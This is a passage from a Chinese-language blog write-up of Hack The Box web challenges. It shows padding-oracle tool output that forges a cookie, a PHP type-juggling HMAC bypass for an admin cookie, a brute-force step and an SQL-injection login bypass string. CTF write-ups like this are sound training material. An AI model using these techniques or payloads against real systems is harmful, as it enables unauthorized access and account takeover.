class="number">256</span>) <span class="string">[Byte 2]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">96</span>/<span class="number">256</span>) <span class="string">[Byte 1]</span></span><br><span class="line"></span><br><span class="line">Block <span class="number">3</span> Results:</span><br><span class="line"><span class="string">[+]</span> New Cipher Text (HEX): 8a6b238e62ec8b18</span><br><span class="line"><span class="string">[+]</span> Intermediate Bytes (HEX): a8194ce207ceb13a</span><br><span class="line"></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">203</span>/<span class="number">256</span>) <span class="string">[Byte 8]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">77</span>/<span class="number">256</span>) <span class="string">[Byte 7]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">130</span>/<span class="number">256</span>) <span class="string">[Byte 6]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">12</span>/<span class="number">256</span>) <span class="string">[Byte 5]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">6</span>/<span class="number">256</span>) <span class="string">[Byte 4]</span></span><br><span class="line">ERROR: No matching response on <span class="string">[Byte 3]</span></span><br><span class="line">       Automatically trying one more time...</span><br><span class="line">ERROR: No matching response on <span class="string">[Byte 8]</span></span><br><span class="line">Do you want to start this block over? (Yes/No)? <span class="string">[y/n/a]</span> : a</span><br><span class="line">INFO: Switching to interactive mode</span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">203</span>/<span class="number">256</span>) <span class="string">[Byte 8]</span></span><br><span class="line">Do you want to use this value (Yes/No/All)? <span class="string">[y/n/a]</span> : a</span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">77</span>/<span class="number">256</span>) <span class="string">[Byte 7]</span></span><br><span class="line">ERROR: <span class="number">500</span> Can't connect to docker.hackthebox.eu:<span class="number">42414</span> (Connection timed out)</span><br><span class="line">   Retrying in <span class="number">10</span> seconds...</span><br><span class="line"></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">130</span>/<span class="number">256</span>) <span class="string">[Byte 6]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">176</span>/<span class="number">256</span>) <span class="string">[Byte 5]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">129</span>/<span class="number">256</span>) <span class="string">[Byte 4]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">80</span>/<span class="number">256</span>) <span class="string">[Byte 3]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">53</span>/<span class="number">256</span>) <span class="string">[Byte 2]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">14</span>/<span class="number">256</span>) <span class="string">[Byte 1]</span></span><br><span class="line"></span><br><span class="line">Block <span class="number">2</span> Results:</span><br><span class="line"><span class="string">[+]</span> New Cipher Text (HEX): d8add2173d139318</span><br><span class="line"><span class="string">[+]</span> Intermediate Bytes (HEX): faccb67a547db134</span><br><span class="line"></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">83</span>/<span class="number">256</span>) <span class="string">[Byte 8]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">107</span>/<span class="number">256</span>) <span class="string">[Byte 7]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">221</span>/<span class="number">256</span>) <span class="string">[Byte 6]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">52</span>/<span class="number">256</span>) <span class="string">[Byte 5]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">219</span>/<span class="number">256</span>) <span class="string">[Byte 4]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">207</span>/<span class="number">256</span>) <span class="string">[Byte 3]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">239</span>/<span class="number">256</span>) <span class="string">[Byte 2]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">161</span>/<span class="number">256</span>) <span class="string">[Byte 1]</span></span><br><span class="line"></span><br><span class="line">Block <span class="number">1</span> Results:</span><br><span class="line"><span class="string">[+]</span> New Cipher Text (HEX): 2c344253ad52b596</span><br><span class="line"><span class="string">[+]</span> Intermediate Bytes (HEX): 57163720c82097ac</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line"><span class="string">[+]</span> Encrypted value is: LDRCU61StZbYrdIXPROTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D</span><br><span class="line">-------------------------------------------------------</span><br></pre></td></tr></table></figure></p>
<p>更改iknowmag1k，得到flag，跑了3个小时（orz）</p>
<h2 id="grammar"><a href="#grammar" class="headerlink" title="grammar"></a>grammar</h2><p>进入网页，出现403<br><img src="https://i.loli.net/2019/05/16/5cdcc23d6865468602.png" alt=""><br>用burpsuite 截获请求，改用<code>post</code>方式访问<a href="http://docker.hackthebox.eu:50101/index.php" target="_blank" rel="noopener">http://docker.hackthebox.eu:50101/index.php</a><br>得到了一个页面<br><img src="https://i.loli.net/2019/05/16/5cdcc3aa1233896306.png" alt=""><br>查看网页源码，注意到一行注释：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTB hint:really not important...totaly solvable without using it! Just there to fill things and to save you from some trouble you might get into :) --&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>所以我们去看他的请求信息会有哪些，注意到了<strong>cookie</strong>：<br><img src="https://i.loli.net/2019/05/16/5cdcc4c39a17959432.png" alt=""><br>base64解码之后：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"User"</span>:<span class="string">"admin"</span>,<span class="attr">"Admin"</span>:<span class="string">"False"</span>,<span class="attr">"MAC"</span>:<span class="string">"ef7bf3acf4e370f991a6342b4f57dee1"</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>有两个地方需要改，<code>Admin</code>和<code>MAC</code>，关键就在于<strong>MAC</strong><br>查看了他人的writeup，发现在<a href="https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf" target="_blank" rel="noopener">https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf</a> 指出了HMAC算法的问题<br><img src="https://i.loli.net/2019/05/16/5cdccefd80f4f86580.png" alt=""><br>因为：<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(‘aa’==<span class="number">0</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>的结果是<strong>true</strong>,所以我们尝试构造：<br><img src="https://i.loli.net/2019/05/16/5cdcd15a867b618705.png" alt=""><br>将<strong>cookie</strong>改为上述值，则可到flag</p>
<h2 id="Lernaean"><a href="#Lernaean" class="headerlink" title="Lernaean"></a>Lernaean</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180919184650-507feb54-bbf9-1.png" alt=""></p>
<p>赤裸裸的提示爆破，于是利用burp，字典设为<strong>username</strong>，最终找到flag</p>
<h2 id="Cartographer"><a href="#Cartographer" class="headerlink" title="Cartographer"></a>Cartographer</h2><p>用burp监测到<code>sql inject</code>，并且直接注出了页面（也可以利用万能密码：user：<code>admin&#39;/*</code> pass：<code>密码*/&#39;</code>），但是：</p>
<blockquote>
<p><br>Cartographer<br>Is Still<br>Under Construction!        </p>
</blockquote>
<p>注意到地址栏<code>panel.php?info=home</code>，将其改为flag，则读到了flag</p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/05/03/靶机/hack the box邀请码获取和web challenge/">http://microvorld.com/2019/05/03/靶机/hack the box邀请码获取和web challenge/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/05/04/cve/CNVD-C-2019-48814/" title="CNVD-C-2019-48814"><span>< PreviousPost</span><br><span class="prevTitle">CNVD-C-2019-48814</span></a><a class="nextSlogan" href="/2019/05/03/靶机/xss-quiz/" title="XSS Challenges"><span>NextPost ></span><br><span class="nextTitle">XSS Challenges</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hack-the-box邀请码获取和web-challenge"><span class="toc-number">1.</span> <span class="toc-text">hack the box邀请码获取和web challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hack-the-box邀请码获取"><span class="toc-number">1.1.</span> <span class="toc-text">hack the box邀请码获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-challenge"><span class="toc-number">1.2.</span> <span class="toc-text">web challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HDC"><span class="toc-number">1.2.1.</span> <span class="toc-text">HDC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#All-good-boys-are-here…-hehehehehehe"><span class="toc-number">1.3.</span> <span class="toc-text">All good boys are here… hehehehehehe!</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#I-know-Mag1k"><span class="toc-number">1.3.1.</span> <span class="toc-text">I know Mag1k</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#grammar"><span class="toc-number">1.4.</span> <span class="toc-text">grammar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lernaean"><span class="toc-number">1.5.</span> <span class="toc-text">Lernaean</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cartographer"><span class="toc-number">1.6.</span> <span class="toc-text">Cartographer</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>